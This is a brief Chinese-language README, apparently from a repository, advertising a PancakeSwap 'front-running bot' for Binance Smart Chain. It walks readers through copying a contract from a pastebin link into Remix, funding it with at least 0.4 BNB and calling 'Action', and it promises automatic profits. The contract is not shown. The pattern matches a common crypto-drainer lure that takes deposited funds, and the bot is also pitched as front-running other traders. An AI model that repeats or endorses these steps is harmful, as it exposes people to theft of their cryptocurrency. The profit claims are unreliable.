# pancakeswap-bot-web3
这是一个DEX自动夹子套利机器人，展示个简单的基于Solidity部署的夹子机器人，夹子机器人可以自动定位添加到BSC中的交易对，并立即抢先买入并买入以此获得盈利。

该合约的当前参数是，只要在在Remix中执行“Action”函数。10%的利润自动重新进入夹子机器人资金池，并自动将90%的利润交易返回绑定的钱包。剩余的将会继续运作以此继续获取利润。

注意：本合同是为Binance智能链设计的，不适用于以太坊mainnet（例如UniSwap）

#获取小狐狸钱包：
https://metamask.io/download.html

#将BSC智能链添加到小狐狸钱包：
https://academy.binance.com/en/articl...

#remix部署网站：
https://remix.ethereum.org/

#复制smartcontract到remix：
https://pastebin.com/raw/5Q4v1m1V

视频教程搬运：https://www.youtube.com/watch?app=desktop&v=8JfXLDaygjg

////补充:
收到有的人的留言，他们没有为合约提供足够的资金来支付手续费和可能的代币燃烧费。Bot的目标虚拟币可能最高会有10%代币燃烧费，但现在大多数代币都有3~6%的燃烧费用。单次交易手续费平均为0.006*2（0.12），但是bot可能会去夹燃烧费较高的虚拟币，如果只给合约转账0.2 BNB，那么合约可能会燃烧掉的要高于收益。根据我的经验，建议为合约提供至少0.4bnb的资金，这样就能让夹子机器人运行的更久一点。

- Tags:
pancakeswap bot
薄饼机器人
pancakeswap front run bot
薄饼夹子机器人
Auto BNB profit
自动获利BNB
binance smart chain
币安智能链
binance smart chain wallet
币安智能链钱包
